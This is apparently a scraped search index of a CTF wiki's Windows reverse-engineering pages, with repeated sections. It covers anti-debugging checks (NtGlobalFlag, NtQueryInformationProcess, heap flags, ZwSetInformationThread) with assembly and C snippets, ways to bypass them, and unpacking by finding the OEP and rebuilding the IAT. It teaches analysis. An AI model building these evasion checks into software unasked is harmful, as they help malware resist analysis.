HKLM\\System\\CurrentControlSet\\Control\\SessionManager will be replaced by the NtGlobalFlag field. Although it may be changed by Windows (described below), the registry key will be on the system. All processes in the process have an impact and take effect after the restart. Of course, this also produces another way to detect the debugger: If a debugger copies the key values in the registry to the NtGlobalFlag field in order to hide itself, the key values in the registry have been replaced beforehand and have not yet been The restart takes effect. Then the debugger just copies a fake value, not the one that is really needed. If the program knows the real value instead of the fake value in the registry, then the debugger can be detected. Of course, the debugger can also run other processes and then query the NtGlobalFlag field to get the real value. It is still GlobalFlag , but here is HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ <filename> . (Image hijacking), here you need to Replace the file name of the executable file that needs to be changed (no need to specify the path). After setting GlobalFlag , the system will overwrite its value to the NtGlobalFlag` field (only covered for the specified process). Can be changed again by Windows (see below). Load two fields in the configuration table ( Load Configuration Table ): GlobalFlagsClear and GlobalFlagsSet . GlobalFlagsClear lists the flags that need to be cleared, and GlobalFlagsSet lists the flags that need to be set. These settings will take effect after the GlobalFlag application, so it can override the value specified by GlobalFlag . However it Cannot override the flag set by Windows. For example, setting FLG_USER_STACK_TRACE_DB (0x1000) allows Windows to set the FLG_HEAP_VALIDATE_PARAMETERS (0x40) flag, even if FLG_HEAP_VALIDATE_PARAMETERS is cleared in the load configuration table ( Load Configuration Table ). Windows will also be reset during subsequent process loading. When the debugger creates a process, Windows will make some changes. By setting _NO_DEBUG_HEAP in the environment variable, NtGlobalFlag will not set the flags of the 3 heaps because of the debugger. Of course they are still You can continue to set it by GlobalFlag or by loading GlobalFlagsSet in the configuration table. How to bypass detection? \u00b6 There are 3 ways to bypass the detection of NtGlobalFlag Manually modify the value of the flag bit ( FLG_HEAP_ENABLE_TAIL_CHECK , FLG_HEAP_ENABLE_FREE_CHECK , FLG_HEAP_VALIDATE_PARAMETERS ) Use the hide-debug plugin in Ollydbg Start the program in the way that Windbg disables the debug heap ( windbg -hd program.exe ) Manual bypass example \u00b6 The following is an example that demonstrates how to manually bypass detection. ` asm .text:00403594 64 A1 30 00 00 00 mov eax, large fs:30h ; PEB struct loaded into EAX .text:0040359A db 3Eh ; IDA Pro display error (the byte is actually used in the next instruction) .text:0040359A 3E 8B 40 68 mov eax, [eax+68h] ; NtGlobalFlag (offset 0x68 relative to PEB) saved to EAX .text:0040359E 83 E8 70 sub eax, 70h ; Value 0x70 corresponds to all flags on (FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS) .text:004035A1 89 85 D8 E7 FF FF mov [ebp+var_1828], eax .text:004035A7 83 BD D8 E7 FF FF 00 cmp [ebp+var_1828], 0 ; Check whether 3 debug flags were on (result of substraction should be 0 if debugged) .text:004035AE 75 05 jnz short loc_4035B5 ; No debugger, program continues... .text:004035B0 E8 4B DA FF FF call s_selfDelete ; ...else, malware deleted ``` Set the breakpoint in offset 0x40359A in Ollydbg, run the program to trigger the breakpoint. Then open the CommandLine plugin with dump fs:[30]+0x68 dump out the contents of NtGlobalFlag Right-click Binary-&gt;Fill with 00&#39;s and replace the value 0x70 with 0x00 . Reference link \u00b6 The \"Ultimate\" Anti-Debugging Reference PEB-Process-Environment-Block/NtGlobalFlag","title":"NtGlobalFlag"},{"location":"reverse/windows/anti-debug/ntglobalflag/#about-ntglobalflag","text":"On 32-bit machines, the NtGlobalFlag field is located at the offset of PEB (process environment block) 0x68 , and the 64-bit machine is at offset '0xBC`. The default value for this field is 0. When debugging This field is set to a specific value while the device is running. Although this value does not quite indicate that a debugger is actually running, this field is often used for this purpose. This field contains a series of flag bits. The process created by the debugger sets the following flags: FLG_HEAP_ENABLE_TAIL_CHECK ( 0x10 ) FLG_HEAP_ENABLE_FREE_CHECK ( 0x20 ) FLG_HEAP_VALIDATE_PARAMETERS ( 0x40 )","title":"About NtGlobalFlag"},{"location":"reverse/windows/anti-debug/ntglobalflag/#detection-code","text":"Therefore, you can check these flags to detect the presence of the debugger. For example, use the 32-bit code below to detect on a 32-bit machine: ` asm mov eax, fs:[30h] ;Process Environment Block mov al, [eax+68h] ;NtGlobalFlag and al, 70h cmp al, 70h je being_debugged The following is the detection code for 64-bit code on a 64-bit machine: `` `asm push 60h pop rsi gs:lodsq ;Process Environment Block mov al, [rsi*2+rax-14h] ;NtGlobalFlag and al, 70h cmp al, 70h je being_debugged It should be noted that if a 32-bit program is running on a 64-bit machine, there will actually be two PEBs: one is a 32-bit part and the other is a 64-bit. The corresponding field of the 64-bit PEB will also look like Changed in 32-bit. So we have the following, using a 32-bit code to detect the 64-bit machine environment: mov eax, fs:[30h] ; Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov al, [eax+10bch] ;NtGlobalFlag and al, 70h cmp al, 70h je being_debugged Remember not to compare directly without masking other bits, so you won't be able to detect the debugger. In ExeCryptor , the NtGlobalFlag is used to detect the debugger, but the three flags of NtGlobalFlag are only when the program is created by the debugger instead of the process attached by the debugger. Will be set.","title":"Detection code"},{"location":"reverse/windows/anti-debug/ntglobalflag/#change-the-initial-value-of-ntglobalflag","text":"Of course, the way to bypass this detection is also very simple, that is, the debugger wants to reset the field to 0. However, this default initial value can be changed in any of the following four ways: The value of GlobalFlag of the registry HKLM\\System\\CurrentControlSet\\Control\\SessionManager will be replaced by the NtGlobalFlag field. Although it may be changed by Windows (described below), the registry key will be on the system. All processes in the process have an impact and take effect after the restart. Of course, this also produces another way to detect the debugger: If a debugger copies the key values in the registry to the NtGlobalFlag field in order to hide itself, the key values in the registry have been replaced beforehand and have not yet been The restart takes effect. Then the debugger just copies a fake value, not the one that is really needed. If the program knows the real value instead of the fake value in the registry, then the debugger can be detected. Of course, the debugger can also run other processes and then query the NtGlobalFlag field to get the real value. It is still GlobalFlag , but here is HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ <filename> . (Image hijacking), here you need to Replace the file name of the executable file that needs to be changed (no need to specify the path). After setting GlobalFlag , the system will overwrite its value to the NtGlobalFlag` field (only covered for the specified process). Can be changed again by Windows (see below). Load two fields in the configuration table ( Load Configuration Table ): GlobalFlagsClear and GlobalFlagsSet . GlobalFlagsClear lists the flags that need to be cleared, and GlobalFlagsSet lists the flags that need to be set. These settings will take effect after the GlobalFlag application, so it can override the value specified by GlobalFlag . However it Cannot override the flag set by Windows. For example, setting FLG_USER_STACK_TRACE_DB (0x1000) allows Windows to set the FLG_HEAP_VALIDATE_PARAMETERS (0x40) flag, even if FLG_HEAP_VALIDATE_PARAMETERS is cleared in the load configuration table ( Load Configuration Table ). Windows will also be reset during subsequent process loading. When the debugger creates a process, Windows will make some changes. By setting _NO_DEBUG_HEAP in the environment variable, NtGlobalFlag will not set the flags of the 3 heaps because of the debugger. Of course they are still You can continue to set it by GlobalFlag or by loading GlobalFlagsSet in the configuration table.","title":"Change the initial value of NtGlobalFlag"},{"location":"reverse/windows/anti-debug/ntglobalflag/#how-to-bypass-detection","text":"There are 3 ways to bypass the detection of NtGlobalFlag Manually modify the value of the flag bit ( FLG_HEAP_ENABLE_TAIL_CHECK , FLG_HEAP_ENABLE_FREE_CHECK , FLG_HEAP_VALIDATE_PARAMETERS ) Use the hide-debug plugin in Ollydbg Start the program in the way that Windbg disables the debug heap ( windbg -hd program.exe )","title":"How to bypass detection?"},{"location":"reverse/windows/anti-debug/ntglobalflag/#manual-bypass-example","text":"The following is an example that demonstrates how to manually bypass detection. ` asm .text:00403594 64 A1 30 00 00 00 mov eax, large fs:30h ; PEB struct loaded into EAX .text:0040359A db 3Eh ; IDA Pro display error (the byte is actually used in the next instruction) .text:0040359A 3E 8B 40 68 mov eax, [eax+68h] ; NtGlobalFlag (offset 0x68 relative to PEB) saved to EAX .text:0040359E 83 E8 70 sub eax, 70h ; Value 0x70 corresponds to all flags on (FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS) .text:004035A1 89 85 D8 E7 FF FF mov [ebp+var_1828], eax .text:004035A7 83 BD D8 E7 FF FF 00 cmp [ebp+var_1828], 0 ; Check whether 3 debug flags were on (result of substraction should be 0 if debugged) .text:004035AE 75 05 jnz short loc_4035B5 ; No debugger, program continues... .text:004035B0 E8 4B DA FF FF call s_selfDelete ; ...else, malware deleted ``` Set the breakpoint in offset 0x40359A in Ollydbg, run the program to trigger the breakpoint. Then open the CommandLine plugin with dump fs:[30]+0x68 dump out the contents of NtGlobalFlag Right-click Binary-&gt;Fill with 00&#39;s and replace the value 0x70 with 0x00 .","title":"Manual bypass example"},{"location":"reverse/windows/anti-debug/ntglobalflag/#reference-link","text":"The \"Ultimate\" Anti-Debugging Reference PEB-Process-Environment-Block/NtGlobalFlag","title":"Reference link"},{"location":"reverse/windows/anti-debug/ntqueryinformationprocess/","text":"NTSTATUS WINAPI NtQueryInformationProcess ( _In_ HANDLE ProcessHandle , _In_ PROCESSINFOCLASS ProcessInformationClass , _Out_ PVOID ProcessInformation , _In_ ULONG ProcessInformationLength , _Out_opt_ MEMBER OF ReturnLength ); ProcessDebugPort \u00b6 The undocumented ntdll NtQueryInformationProcess() function accepts an information class parameter for query. ProcessDebugPort(7) is one of the information classes. kernel32``CheckRemoteDebuggerPresent() function is called internally. NtQueryInformationProcess() is used to detect debugging, while NtQueryInformationProcess internally queries the DebugPort field of the EPROCESS structure. When the process is being debugged, the return value is 0xffffffff`. It can be detected in a 32-bit environment with the following 32-bit code: ` asm push eax mov eax, esp push 0 push 4 ;ProcessInformationLength push eax push 7 ;ProcessDebugPort push -1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax inc eax je being_debugged Detect in a 64-bit environment with the following 64-bit code: `` `asm xor ebp, ebp enter 20h, 0 push 8 ;ProcessInformationLength pop r9 push rbp pop r8 push 7 ;ProcessDebugPort pop rdx or rcx, -1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp, ebp jne being_debugged Since the information is passed from the kernel, there is no easy way to prevent the function from detecting the debugger in user mode. ProcessDebugObjectHandle \u00b6 Windows XP introduces the debug object . When a debug session starts, it creates a debug object and a handle associated with it. We can use the ProcessDebugObjectHandle (0x1e) class to query the value of this handle. It can be detected in a 32-bit environment with the following 32-bit code: ` asm push 0 mov eax, esp push 0 push 4 ;ProcessInformationLength push eax push 1eh ;ProcessDebugObjectHandle push -1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax test eax, eax jne being_debugged Detect in a 64-bit environment with the following 64-bit code: `` `asm xor ebp, ebp enter 20h, 0 push 8 ;ProcessInformationLength pop r9 push rbp pop r8 push 1eh ;ProcessDebugObjectHandle pop rdx or rcx, -1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp, ebp jne being_debugged ProcessDebugFlags \u00b6 The ProcessDebugFlags (0x1f) class returns the opposite of NoDebugInherit of the EPROCESS structure. This means that when the debugger exists, the return value is 0 , and when it does not exist, it returns 1 . It can be detected in a 32-bit environment with the following 32-bit code: ` asm push eax mov eax, esp push 0 push 4 ;ProcessInformationLength push eax push 1fh ;ProcessDebugFlags push -1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax test eax, eax je being_debugged Detect in a 64-bit environment with the following 64-bit code: `` `asm xor ebp, ebp enter 20h, 0 push 4 ;ProcessInformationLength pop r9 push rbp pop r8 push 1fh ;ProcessDebugFlags pop rdx or rcx, -1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp, ebp je being_debugged","title":"NtQueryInformationProcess"},{"location":"reverse/windows/anti-debug/ntqueryinformationprocess/#processdebugport","text":"The undocumented ntdll NtQueryInformationProcess() function accepts an information class parameter for query. ProcessDebugPort(7) is one of the information classes. kernel32``CheckRemoteDebuggerPresent() function is called internally. NtQueryInformationProcess() is used to detect debugging, while NtQueryInformationProcess internally queries the DebugPort field of the EPROCESS structure. When the process is being debugged, the return value is 0xffffffff`. It can be detected in a 32-bit environment with the following 32-bit code: ` asm push eax mov eax, esp push 0 push 4 ;ProcessInformationLength push eax push 7 ;ProcessDebugPort push -1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax inc eax je being_debugged Detect in a 64-bit environment with the following 64-bit code: `` `asm xor ebp, ebp enter 20h, 0 push 8 ;ProcessInformationLength pop r9 push rbp pop r8 push 7 ;ProcessDebugPort pop rdx or rcx, -1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp, ebp jne being_debugged Since the information is passed from the kernel, there is no easy way to prevent the function from detecting the debugger in user mode.","title":"ProcessDebugPort"},{"location":"reverse/windows/anti-debug/ntqueryinformationprocess/#processdebugobjecthandle","text":"Windows XP introduces the debug object . When a debug session starts, it creates a debug object and a handle associated with it. We can use the ProcessDebugObjectHandle (0x1e) class to query the value of this handle. It can be detected in a 32-bit environment with the following 32-bit code: ` asm push 0 mov eax, esp push 0 push 4 ;ProcessInformationLength push eax push 1eh ;ProcessDebugObjectHandle push -1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax test eax, eax jne being_debugged Detect in a 64-bit environment with the following 64-bit code: `` `asm xor ebp, ebp enter 20h, 0 push 8 ;ProcessInformationLength pop r9 push rbp pop r8 push 1eh ;ProcessDebugObjectHandle pop rdx or rcx, -1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp, ebp jne being_debugged","title":"ProcessDebugObjectHandle"},{"location":"reverse/windows/anti-debug/ntqueryinformationprocess/#processdebugflags","text":"The ProcessDebugFlags (0x1f) class returns the opposite of NoDebugInherit of the EPROCESS structure. This means that when the debugger exists, the return value is 0 , and when it does not exist, it returns 1 . It can be detected in a 32-bit environment with the following 32-bit code: ` asm push eax mov eax, esp push 0 push 4 ;ProcessInformationLength push eax push 1fh ;ProcessDebugFlags push -1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax test eax, eax je being_debugged Detect in a 64-bit environment with the following 64-bit code: `` `asm xor ebp, ebp enter 20h, 0 push 4 ;ProcessInformationLength pop r9 push rbp pop r8 push 1fh ;ProcessDebugFlags pop rdx or rcx, -1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp, ebp je being_debugged","title":"ProcessDebugFlags"},{"location":"reverse/windows/anti-debug/the-heap/","text":"When the heap is initialized, it will check heap flags and make additional changes to the environment depending on the presence or absence of some flags. Like Themida , this method is used to detect the debugger. such as: If the HEAP_TAIL_CHECKING_ENABLED flag is set (see the Heap Flags section), then in the 32-bit windows, 2 0xABABABAB will be appended to the end of the allocated heap block (the 64-bit environment is 4). If the HEAP_FREE_CHECKING_ENABLED (see the Heap Flags section) flag is set, then when extra bytes are needed to fill the end of the heap block, it will be filled with 0xFEEEFEEE (or part) So, a new way to detect the debugger is to check these values. heap pointer is known \u00b6 If a heap pointer is known, then we can directly check the data in the heap. However, in Windows Vista and later, the heap protection mechanism (both 32-bit/64-bit) is used, using an XOR. The key is used to encrypt the heap size. Although you can choose whether to use the key, but the default is used. And the location of the heap header, in Windows NT/2000/XP and Windows Vista and higher. There is also a difference between them. So we also need to take the Windows version into account. The following 32-bit code can be used to detect a 32-bit environment: ` asm xor ebx, ebx call GetVersion cmp al, 6 sbb ebp, ebp jb l1 ;Process Environment Block mov eax, fs:[ebx+30h] mov eax, [eax+18h] ;get process heap base mov ecx, [eax+24h] ;check for protected heap jecxz l1 mov ecx, [ecx] test [eax+4ch], ecx cmovne ebx, [eax+50h] ;conditionally get heap key l1: mov eax, movzx edx, w [eax-8] ;size xor dx, bx movzx ecx, b [eax+ebp-1] ;overhead under it, ecx lea edi, [edx*8+eax] mov al, 0abh mov cl, 8 Repe scasb je being_debugged Or use the following 64-bit code to detect a 64-bit environment: xor ebx, ebx call GetVersion cmp al, 6 sbb rbp, rbp jb l1 ;Process Environment Block mov rax, gs:[rbx+60h] mov eax, [rax+30h] ;get process heap base mov ecx, [rax+40h] ;check for protected heap jrcxz l1 mov ecx, [RCX + 8] test [rax + 7ch], ecx cmovne ebx, [rax+88h] ;conditionally get heap key l1: mov eax, movzx edx, w [rax-8] ;size xor dx, bx add edx, edx movzx ecx, b [rax+rbp-1] ;overhead under it, ecx Lea, [rdx * 8 + rax] mov al, 0abh mov cl, 10h Repe scasb je being_debugged There is no example of using a 32-bit code to detect a 64-bit environment, since a 64-bit heap cannot be parsed by a 32-bit heap function. ## heap pointer unknown If we don&#39;t know the heap pointer, we can use the `HenelWalk()` function of `kernel32` or the `RtlWalkHeap()` function of `ntdll` (or even the `GetCommandLine()` function of `kernel32`). The returned heap The size value will be automatically decrypted, so you don&#39;t need to care about the version of windows anymore. The following 32-bit code can be used to detect a 32-bit environment: `` `asm mov ebx, offset l2 ;get a pointer to a heap block l1: push ebx mov eax, fs:[30h] ;Process Environment Block push d [eax+18h] ;save process heap base call HeapWalk cmp w [ebx+0ah], 4 ;find allocated block jne l1 mov edi, [ebx] ;data pointer add edi, [ebx+4] ;data size mov al, 0abh push 8 pop ecx Repe scasb je being_debugged ... l2: db 1ch dup (0) ;sizeof(PROCESS_HEAP_ENTRY) Or use the following 64-bit code to detect a 64-bit environment: ` asm mov rbx, offset l2 ;get a pointer to a heap block l1: push rbx pop rdx push 60h pop rsi gs:lodsq ;Process Environment Block ;get a pointer to process heap base mov ecx, [rax + 30h] call HeapWalk cmp w [rbx+0eh], 4 ;find allocated block jne l1 mov edi, [rbx] ;data pointer add edi, [rbx+8] ;data size mov al, 0abh push 10h pop rcx Repe scasb je being_debugged ... l2: db 28h dup (0) ;sizeof(PROCESS_HEAP_ENTRY) ``` There is no example of using a 32-bit code to detect a 64-bit environment, since a 64-bit heap cannot be parsed by a 32-bit heap function.","title":"The Heap"},{"location":"reverse/windows/anti-debug/the-heap/#heap-pointer-is-known","text":"If a heap pointer is known, then we can directly check the data in the heap. However, in Windows Vista and later, the heap protection mechanism (both 32-bit/64-bit) is used, using an XOR. The key is used to encrypt the heap size. Although you can choose whether to use the key, but the default is used. And the location of the heap header, in Windows NT/2000/XP and Windows Vista and higher. There is also a difference between them. So we also need to take the Windows version into account. The following 32-bit code can be used to detect a 32-bit environment: ` asm xor ebx, ebx call GetVersion cmp al, 6 sbb ebp, ebp jb l1 ;Process Environment Block mov eax, fs:[ebx+30h] mov eax, [eax+18h] ;get process heap base mov ecx, [eax+24h] ;check for protected heap jecxz l1 mov ecx, [ecx] test [eax+4ch], ecx cmovne ebx, [eax+50h] ;conditionally get heap key l1: mov eax, movzx edx, w [eax-8] ;size xor dx, bx movzx ecx, b [eax+ebp-1] ;overhead under it, ecx lea edi, [edx*8+eax] mov al, 0abh mov cl, 8 Repe scasb je being_debugged Or use the following 64-bit code to detect a 64-bit environment: xor ebx, ebx call GetVersion cmp al, 6 sbb rbp, rbp jb l1 ;Process Environment Block mov rax, gs:[rbx+60h] mov eax, [rax+30h] ;get process heap base mov ecx, [rax+40h] ;check for protected heap jrcxz l1 mov ecx, [RCX + 8] test [rax + 7ch], ecx cmovne ebx, [rax+88h] ;conditionally get heap key l1: mov eax, movzx edx, w [rax-8] ;size xor dx, bx add edx, edx movzx ecx, b [rax+rbp-1] ;overhead under it, ecx Lea, [rdx * 8 + rax] mov al, 0abh mov cl, 10h Repe scasb je being_debugged There is no example of using a 32-bit code to detect a 64-bit environment, since a 64-bit heap cannot be parsed by a 32-bit heap function. ## heap pointer unknown If we don&#39;t know the heap pointer, we can use the `HenelWalk()` function of `kernel32` or the `RtlWalkHeap()` function of `ntdll` (or even the `GetCommandLine()` function of `kernel32`). The returned heap The size value will be automatically decrypted, so you don&#39;t need to care about the version of windows anymore. The following 32-bit code can be used to detect a 32-bit environment: `` `asm mov ebx, offset l2 ;get a pointer to a heap block l1: push ebx mov eax, fs:[30h] ;Process Environment Block push d [eax+18h] ;save process heap base call HeapWalk cmp w [ebx+0ah], 4 ;find allocated block jne l1 mov edi, [ebx] ;data pointer add edi, [ebx+4] ;data size mov al, 0abh push 8 pop ecx Repe scasb je being_debugged ... l2: db 1ch dup (0) ;sizeof(PROCESS_HEAP_ENTRY) Or use the following 64-bit code to detect a 64-bit environment: ` asm mov rbx, offset l2 ;get a pointer to a heap block l1: push rbx pop rdx push 60h pop rsi gs:lodsq ;Process Environment Block ;get a pointer to process heap base mov ecx, [rax + 30h] call HeapWalk cmp w [rbx+0eh], 4 ;find allocated block jne l1 mov edi, [rbx] ;data pointer add edi, [rbx+8] ;data size mov al, 0abh push 10h pop rcx Repe scasb je being_debugged ... l2: db 28h dup (0) ;sizeof(PROCESS_HEAP_ENTRY) ``` There is no example of using a 32-bit code to detect a 64-bit environment, since a 64-bit heap cannot be parsed by a 32-bit heap function.","title":"heap pointer is known"},{"location":"reverse/windows/anti-debug/thread_local_storage/","text":"Thread Local Storage(TLS) \u00b6 Thread Local Storage (TLS) is used to initialize specific thread data before the thread starts, because each process contains at least 1 thread, which initializes the data before the main thread runs. Initialization can be done by specifying a copy that has been copied to dynamically allocated memory. The static buffer in the middle, and / or by executing the code in the callback function array to initialize the dynamic memory content. Often caused by the abuse of the callback function array. At runtime, the contents of the TLS callback function array can be modified or added. The newly added or newly modified callback function will be called with the new address. There is no limit to the number of callback functions. The expansion of the array can be done with the following code: ` asm l1: mov d [offset cbEnd], offset l2 right l2: ... ``` When the callback at l1 returns, it will continue to call the callback function of l2. todo: continue to finish it","title":"Thread Local Storage(TLS)"},{"location":"reverse/windows/anti-debug/thread_local_storage/#thread-local-storagetls","text":"Thread Local Storage (TLS) is used to initialize specific thread data before the thread starts, because each process contains at least 1 thread, which initializes the data before the main thread runs. Initialization can be done by specifying a copy that has been copied to dynamically allocated memory. The static buffer in the middle, and / or by executing the code in the callback function array to initialize the dynamic memory content. Often caused by the abuse of the callback function array. At runtime, the contents of the TLS callback function array can be modified or added. The newly added or newly modified callback function will be called with the new address. There is no limit to the number of callback functions. The expansion of the array can be done with the following code: ` asm l1: mov d [offset cbEnd], offset l2 right l2: ... ``` When the callback at l1 returns, it will continue to call the callback function of l2. todo: continue to finish it","title":"Thread Local Storage(TLS)"},{"location":"reverse/windows/anti-debug/zwsetinformationthread/","text":"About ZwSetInformationThread \u00b6 ZwSetInformationThread is same as NtSetInformationThread. By setting the ThreadHideFromDebugger for a thread, you can disable the thread from generating debugging events. The code is as follows #include <Windows.h> #include <stdio.h> typedef DWORD ( WINAPI * ZW_SET_INFORMATION_THREAD ) ( HANDLE , DWORD , PVOID , ULONG ); #define ThreadHideFromDebugger 0x11 VOID DisableDebugEvent ( VOID ) { HINSTANCE hModule ; ZW_SET_INFORMATION_THREAD ZwSetInformationThread ; hModule = GetModuleHandleA ( \"Ntdll\" ); ZwSetInformationThread = ( ZW_SET_INFORMATION_THREAD ) GetProcAddress ( hModule , \"ZwSetInformationThread\" ); ZwSetInformationThread ( GetCurrentThread (), ThreadHideFromDebugger , 0 , 0 ); } int main () { printf ( \"Begin \\n \" ); DisableDebugEvent (); printf ( \"End \\n \" ); return 0 ; } The key code is ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0); . If it is in debugging state, the program will exit after executing this line of code. How to bypass \u00b6 Note that the second parameter of the ZwSetInformationThread function is ThreadHideFromDebugger, which value is 0x11. When debugging the function and the second parameter value is 0x11, skip the function or change 0x11 to other value.","title":"ZwSetInformationThread"},{"location":"reverse/windows/anti-debug/zwsetinformationthread/#about-zwsetinformationthread","text":"ZwSetInformationThread is same as NtSetInformationThread. By setting the ThreadHideFromDebugger for a thread, you can disable the thread from generating debugging events. The code is as follows #include <Windows.h> #include <stdio.h> typedef DWORD ( WINAPI * ZW_SET_INFORMATION_THREAD ) ( HANDLE , DWORD , PVOID , ULONG ); #define ThreadHideFromDebugger 0x11 VOID DisableDebugEvent ( VOID ) { HINSTANCE hModule ; ZW_SET_INFORMATION_THREAD ZwSetInformationThread ; hModule = GetModuleHandleA ( \"Ntdll\" ); ZwSetInformationThread = ( ZW_SET_INFORMATION_THREAD ) GetProcAddress ( hModule , \"ZwSetInformationThread\" ); ZwSetInformationThread ( GetCurrentThread (), ThreadHideFromDebugger , 0 , 0 ); } int main () { printf ( \"Begin \\n \" ); DisableDebugEvent (); printf ( \"End \\n \" ); return 0 ; } The key code is ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0); . If it is in debugging state, the program will exit after executing this line of code.","title":"About ZwSetInformationThread"},{"location":"reverse/windows/anti-debug/zwsetinformationthread/#how-to-bypass","text":"Note that the second parameter of the ZwSetInformationThread function is ThreadHideFromDebugger, which value is 0x11. When debugging the function and the second parameter value is 0x11, skip the function or change 0x11 to other value.","title":"How to bypass"},{"location":"reverse/windows/unpack/direct-oep/","text":"The so-called one-step OEP shelling method is based on the characteristics of the shelling, looking for the assembly instruction closest to OEP, then the int3 breakpoint, and the dump program when the program goes to OEP. For example, some compression shells tend to be particularly close to OEP or large jmp. Therefore, using Ollydbg's search function, you can search the shell's feature assembly code to achieve the effect of one step breakpoint to OEP. \u8981\u70b9 \u00b6 ctrl+f find popad ctrl+l jumps to the next match Find the match, confirm that the shell is ready to jump to the OEP part, then set the breakpoint to run there. Only for a very small number of compression shells example \u00b6 The sample program can be downloaded here: 3_direct2oep.zip Still use the original notepad.exe to illustrate, after opening with Ollydbg , we press ctrl+f to find the specified string, like popad is a typical feature, some shells are commonly used. Popad to restore state, so search for popad` as shown below. In this example, when the searched 'popad does not meet our requirements, you can press ctrl+l` to search for the next match, about three or four times, we found a jump to OEP. Location.","title":"One Step to the OEP Method"},{"location":"reverse/windows/unpack/direct-oep/#_1","text":"ctrl+f find popad ctrl+l jumps to the next match Find the match, confirm that the shell is ready to jump to the OEP part, then set the breakpoint to run there. Only for a very small number of compression shells","title":"\u8981\u70b9"},{"location":"reverse/windows/unpack/direct-oep/#example","text":"The sample program can be downloaded here: 3_direct2oep.zip Still use the original notepad.exe to illustrate, after opening with Ollydbg , we press ctrl+f to find the specified string, like popad is a typical feature, some shells are commonly used. Popad to restore state, so search for popad` as shown below. In this example, when the searched 'popad does not meet our requirements, you can press ctrl+l` to search for the next match, about three or four times, we found a jump to OEP. Location.","title":"example"},{"location":"reverse/windows/unpack/esp/","text":"ESP law is a weapon for shelling, and it is one of the most frequently used methods for shelling. \u8981\u70b9 \u00b6 The principle of ESP law is to use the stack balance in the program to quickly find OEP. Because in the process of self-decryption or self-extraction, many shells will first push the current register state, such as using pushad , after the decompression ends, the previous register values will be popped, such as using popad . When the register is popped, the program code is often restored, and the hardware breakpoint is triggered. Then at the current position of the program, it is easy to reach the correct OEP position with only a few single steps. The program just loaded and started pushad/pushfd Set all the registers to the ESP register and set the hardware breakpoint. Run the program, trigger a breakpoint Remove hardware breakpoints and start analyzing example \u00b6 The sample program can be downloaded here: 2_esp.zip As the example in the previous article, enter a sentence popad , we press F8 to execute popad to save the register state. We can find in the register window on the right that the value of the ESP register has changed to red, that is, the value has changed. . We right click on the value of the ESP register, which is 0019FF64 in the figure. After selecting HW break[ESP] , press F9 to run the program, and the program will break when the breakpoint is triggered. Came to the position of 0040D3B0 . Here is the position we arrived in the single step tracking, the rest will not go into details.","title":"ESP Law"},{"location":"reverse/windows/unpack/esp/#_1","text":"The principle of ESP law is to use the stack balance in the program to quickly find OEP. Because in the process of self-decryption or self-extraction, many shells will first push the current register state, such as using pushad , after the decompression ends, the previous register values will be popped, such as using popad . When the register is popped, the program code is often restored, and the hardware breakpoint is triggered. Then at the current position of the program, it is easy to reach the correct OEP position with only a few single steps. The program just loaded and started pushad/pushfd Set all the registers to the ESP register and set the hardware breakpoint. Run the program, trigger a breakpoint Remove hardware breakpoints and start analyzing","title":"\u8981\u70b9"},{"location":"reverse/windows/unpack/esp/#example","text":"The sample program can be downloaded here: 2_esp.zip As the example in the previous article, enter a sentence popad , we press F8 to execute popad to save the register state. We can find in the register window on the right that the value of the ESP register has changed to red, that is, the value has changed. . We right click on the value of the ESP register, which is 0019FF64 in the figure. After selecting HW break[ESP] , press F9 to run the program, and the program will break when the breakpoint is triggered. Came to the position of 0040D3B0 . Here is the position we arrived in the single step tracking, the rest will not go into details.","title":"example"},{"location":"reverse/windows/unpack/fix-iat/","text":"Principle \u00b6 After finding the program OEP, we need to dump the program and rebuild the IAT . IAT full name is Import Address Table , the entry points to the actual address of the function. example \u00b6 For example, as follows, we found OEP and reached the real entry point of the program. We need to dump the program. Right click, select &quot;Use OllyDump to unpack the debugging process&quot; (but you can also use LoadPE`) Dump out): A window pops up to see if the address is correct. The main thing is to check if the 'entry point address' has been selected. Then uncheck the 'Rebuild Input Table'. Name the dump file, I am named dump.exe here. Let's try to run dump.exe , we can find that the program can't run normally. For some simple shells, you dump it and it doesn't work. If you do find the correct OEP and use 'IDA to decompile and see the results well, then your first thought should be that the program &#39;IAT has a problem. You need to rebuild IAT . We need to use ImportREC to help fix the input table. Open ImportREC , select a running process original .exe ( original.exe is the process I am debugging in OD, EIP in OD is in OEP position, using Ollydump Do not close this process afterwards.). ImportREC repair input table entry point needs to know OEP , that is, input in the OEP input box in the middle of the right side of the window. As we know, in Ollydbg we know that the current entry point of the program is 0049C25C , and the mirror base address is 00400000 . So we need to fill in OEP here is 0009C25C We modify the OEP in ImportREC to 0009C25C and then click on 'AutoSearch`. A pop-up prompt box is displayed, \"The discovery may be the original IAT address\". We can click `Get Imports&#39; button to rebuild IAT . The left side will display the address of each imported function in IAT and whether it is valid. Obviously in the figure you can see ImportREC found in memory IAT Position and detect that each function is valid. We click on Fix Dump and open the file that was previously dumped using the OllyDump plugin, which is the dump.exe file. Then ImportREC will help restore the import table and generate the dump_.exe file. dump_.exe will run normally.","title":"DUMP and IAT Reconstruction"},{"location":"reverse/windows/unpack/fix-iat/#principle","text":"After finding the program OEP, we need to dump the program and rebuild the IAT . IAT full name is Import Address Table , the entry points to the actual address of the function.","title":"Principle"},{"location":"reverse/windows/unpack/fix-iat/#example","text":"For example, as 